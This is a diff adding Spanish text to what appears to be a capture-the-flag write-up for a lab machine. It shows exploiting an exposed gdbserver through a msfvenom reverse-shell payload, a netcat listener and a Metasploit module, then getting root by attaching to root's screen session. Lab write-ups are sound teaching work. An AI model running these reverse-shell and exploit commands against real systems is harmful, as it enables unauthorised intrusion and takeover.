@@ -97,4 +97,81 @@ for i in range(1, 1000):
  if len(out)>1:
  print("PID"+str(i)+" : "+out)
 ```
+Esto nos devuelve que hay un gdbserver en dicho puerto
+```
+sh-c while true;do su user -c "cd /home/user; gdbserver -once 0.0.0.0:1337
+/bin/true";done
+```
+## GBD
+
+Es una herramienta de depuración que te ayuda a hurgar dentro de tu
+programas mientras se están ejecutando y también le permite ver qué sucede exactamente cuando su programa
+accidentes.
+
+## gdbbaster 
+
+Es un programa que le permite ejecutar GDB en una máquina diferente a la que está ejecutando el
+programa que se está depurando.
+
+## RCE on gdbbaster
+
+En google encontramos [este](https://www.exploit-db.com/exploits/50539) exploit para gdbaster para la version 9.2
+
+Tambien podemos usar searchsploit
+
+```
+searchsploit gdbserver
+```
+
+Primero con msfvenom generamos el exploit
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=4444 PrependFork=true -o rev.bin
+```
+y abrimos una escucha en dicho puerto
+```
+sudo nc -lvnp 4444
+```
+y utilizamos el payload que hemos creado apuntando a la ip victima
+```
+python3 gdb_rce.py 10.10.11.125:1337 rev.bin
+```
+
+En mi caso esto no ha funcionao y e optado por la opción mas simple
+```
+sudo msfdb run
+use exploit/multi/gdb/gdb_server_exec
+set payload linux/x64/meterpreter/reverse_tcp
+set RHOST 10.10.11.125
+set RPORT 1337
+set LHOST tun0
+set LPORT 1234
+run
+```
+```
+shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+ya dentro podemos coger el user.txt
+
+# PRIVILEGE ESCALATION
+
+Utilizando "ps aux" podemos ver los procesos, 
+
+Encontramos un proceso que crea una imagen de sesión en bucle, y se inicia como root.
+
+Cuando creamos una sesion se crea un directorio en "/var/run/screen" con (S-username) 
+
+En caso de querer conectarnos a una sesion: 
+```
+screen -x user/session_name
+```
+Probamos a conectarnos a la sesion de root
+Antes que nada para que nos lleve a nueva sesión debemos upgradear el tty
+```
+export TERM=xterm
+screen -x root/root
+```
+Estamos dentro!!!
 
